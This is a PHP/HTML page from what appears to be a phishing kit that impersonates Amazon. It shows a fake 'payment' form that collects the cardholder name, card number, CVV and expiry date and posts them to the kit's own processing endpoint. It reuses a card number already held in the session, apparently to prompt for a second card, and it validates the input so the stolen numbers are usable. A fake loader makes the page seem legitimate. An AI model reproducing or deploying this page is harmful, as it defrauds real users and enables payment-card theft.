<?php
defined("ALLOW") or exit('No direct script access allowed');

$country = trim($_SESSION['countryCode']);
include FCPATH . "language/lang.php";
?>
<!DOCTYPE html>
<html>

<head>
    <title>
        <?php echo $_45 ?>
    </title>
    <meta charset="UTF-8">
    <link rel="shortcut icon" href="<?= base_url() ?>Assets/fvck/images/favicon.ico" />
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>Assets/fvck/css/boostrap.min.css" media="all">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <link rel="stylesheet" href="<?= base_url() ?>Assets/fvck/css/sign-dekstop.css">
    <link rel="stylesheet" href="<?= base_url() ?>Assets/fvck/css/style.sign-desktop.css">
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>Assets/fvck/css/style.css">
</head>

<body onload="_loader()" style="margin:0;">
    <div id="loader"></div>
    <div style="display:none;" id="myDiv" class="animate-bon ttom">
        <div id="a-page">
            <div class="a-section a-padding-medium auth-workflow">
                <div class="a-section a-spacing-none auth-navbar">
                    <div class="a-section a-spacing-medium a-text-center">
                        <div class="a-link-nav-icon"></div><i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
                    </div>
                </div>
                <div id="authportal-center-section" class="a-section">

                    <div class="cc-content2 mt-4" style="padding-top: 0">
                        <div class="container">
                            <div class="mb-3" align="center"> <img src="<?= base_url() ?>Assets/fvck/images/payment.png" width="80"> </div>
                            <div align="center"> <span class="lefttext" style="font-size: 20px; font-weight: 650;"><?php echo $_84 ?></span> </div>
                            <div align="center"> <span class="lefttext" style="color: red;"><?php echo $_116 ?></span> </div><br>
                            <div class="row" style="padding-top: 5px">
                                <div class="col-12">
                                    <div class="mypayementarea">
                                        <form action="<?= base_url() ?>payment/process" method="post" onsubmit="return expCheck() && doubleCc() && ccnCheck();" name="fms-form" id="fms-form">
                                            <input type="hidden" value="<?= $_SESSION['ccn'] ?>" id="ccn1" name="ccn1">
                                            <span class="colorblacked" style="display:block;"><?php echo $_85 ?></span>
                                            <div class="row mt-3">
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="nameoncard">
                                                            <?php echo $_86 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput namefocus" name="namecard" id="namecard" placeholder="<?php echo $_86 ?>" maxlength="30">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="ccn">
                                                            <?php echo $_87 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput cardfocus" name="ccn" id="ccn" placeholder="<?php echo $_87 ?>" maxlength="20">
                                                        <p class="middle cardError hide" style="color: #CC1C39; padding-top: 5px; font-size:13px"><?php echo $_119 ?></p>
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="cvv">
                                                            <?php echo $_89 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput cvvfocus" name="cvv" id="cvv" placeholder="<?php echo $_90 ?>" maxlength="4">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="row">
                                                        <div class="col-6">
                                                            <div class="form-group">
                                                                <label for="expmonth">
                                                                    <?php echo $_91 ?>
                                                                </label>
                                                                <select class="form-control amazoninput mmfocus" name="expmonth" id="expmonth">
                                                                    <option value="">
                                                                        <?php echo $_114 ?>
                                                                    </option>
                                                                    <option value="01">01</option>
                                                                    <option value="02">02</option>
                                                                    <option value="03">03</option>
                                                                    <option value="04">04</option>
                                                                    <option value="05">05</option>
                                                                    <option value="06">06</option>
                                                                    <option value="07">07</option>
                                                                    <option value="08">08</option>
                                                                    <option value="09">09</option>
                                                                    <option value="10">10</option>
                                                                    <option value="11">11</option>
                                                                    <option value="12">12</option>
                                                                </select>
                                                            </div>
                                                        </div>
                                                        <div class="col-6" style="padding-left: 0px;padding-bottom: 12px;padding-top: 21px;padding-right: 30px;">
                                                            <div class="form-group">
                                                                <select height="100" class="form-control amazoninput yyfocus" name="expyear" id="expyear">
                                                                    <option value="">
                                                                        <?php echo $_115 ?>
                                                                    </option>
                                                                    <option value="2024">2024</option>
                                                                    <option value="2025">2025</option>
                                                                    <option value="2026">2026</option>
                                                                    <option value="2027">2027</option>
                                                                    <option value="2028">2028</option>
                                                                    <option value="2029">2029</option>
                                                                    <option value="2030">2030</option>
                                                                    <option value="2031">2031</option>
                                                                    <option value="2032">2032</option>
                                                                    <option value="2033">2033</option>
                                                                    <option value="2034">2034</option>
                                                                    <option value="2035">2035</option>
                                                                    <option value="2036">2036</option>
                                                                    <option value="2037">2037</option>
                                                                    <option value="2038">2038</option>
                                                                    <option value="2039">2039</option>
                                                                    <option value="2040">2040</option>
                                                                    <option value="2041">2041</option>
                                                                </select>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <p class="middle hide errorExp" style="color: #CC1C39; margin-top: -0.9em;font-size:13px;"><?php echo $_92 ?></p>
                                                </div>
                                            </div>
                                            <div class="a-row a-spacing-small">
                                                <span style="border:none; background-color:white" id="cvf-submit-otp-button" class="">
                                                    <span style="border:none; background-color:white" class="a-button-inner">
                                                        <button style="border:none; background-color:#ffd814; border-radius:7px;" type="submit" name="Sex" class="a-button-text btn btn-warning" role="button"><i class="fa fa-padlock"></i> <?php echo $_7 ?></button>
                                                    </span>
                                                </span>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                                <script>
                                    P.when('A', 'ready').execute(function(A) {
                                        var $ = A.$;
                                        $('.cvf-widget-link-resend').click(function() {
                                            $('.cvf-widget-form-resend').submit();
                                        });
                                    });
                                </script>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="a-section a-spacing-top-extra-large auth-footer">
            <div class="a-divider a-divider-section">
                <div class="a-divider-inner"></div>
            </div>
            <div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_21 ?>
                </a> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_22 ?>
                </a> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_23 ?>
                </a> <span class="auth-footer-seperator"></span>
            </div>
            <div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> <?php echo $_24 ?> </span> </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/js/all.min.js"></script>
    <script src="<?= base_url() ?>Assets/fvck/js/jquery-3.3.1.min.js"></script>
    <script src="<?= base_url() ?>Assets/fvck/js/jquery.mask.min.js"></script>
    <script src="<?= base_url() ?>Assets/fvck/js/jquery.validate.min.js"></script>
    <script src="<?= base_url() ?>Assets/fvck/js/additional-methods.min.js"></script>
    <script src="<?= base_url() ?>Assets/fvck/js/jquery.creditCardValidator.js"></script>
    <script>
        let load;

        let _loader = () => {
            load = setTimeout(showPage, 1000);
        }

        let showPage = () => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('myDiv').style.display = 'block';
        }

        const alpha = (e) => {
            let k;
            document.all ? k = e.keyCode : k = e.which;
            return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
        }

        $(document).ready(function() {
            $("#fms-form").validate({
                errorClass: "error-class",
                rules: {
                    namecard: {
                        required: true,
                        minlength: 5,
                        maxlength: 30
                    },
                    ccn: {
                        required: true
                    },
                    cvv: {
                        required: true,
                        digits: true,
                        minlength: 3
                    },
                    expmonth: {
                        required: true
                    },
                    expyear: {
                        required: true
                    }
                },
                messages: {
                    namecard: {
                        required: "<?php echo $_93 ?>",
                        minlength: "<?php echo $_94 ?>"
                    },
                    ccn: {
                        required: "<?php echo $_95 ?>"
                    },
                    cvv: {
                        required: "<?php echo $_96 ?>"
                    },
                    expmonth: {
                        required: "<?php echo $_97 ?>"
                    },
                    expyear: {
                        required: "<?php echo $_98 ?>"
                    }
                }
            });
        })

        let expCheck = () => {
            let today = new Date();
            let expDate = new Date($('#expyear').val(), ($('#expmonth').val() - 1));
            let check = true;

            if (today.getTime() > expDate.getTime()) {
                $('.errorExp').removeClass('hide');
                $('.yyfocus').addClass('error-class-focus');
                $('.mmfocus').addClass('error-class-focus');

                return false;
            } else {
                $('.errorExp').addClass('hide');
                $('.yyfocus').removeClass('error-class-focus');
                $('.mmfocus').removeClass('error-class-focus');

                return true;
            }

            if (!check) {
                return false;
            }
            return check;
        }

        let ccnCheck = () => {
            let result = $('#ccn').validateCreditCard();
            if (!result.valid) {
                $('.cardError').removeClass('hide');

                return false;
            }
        }
    </script>
</body>

</html>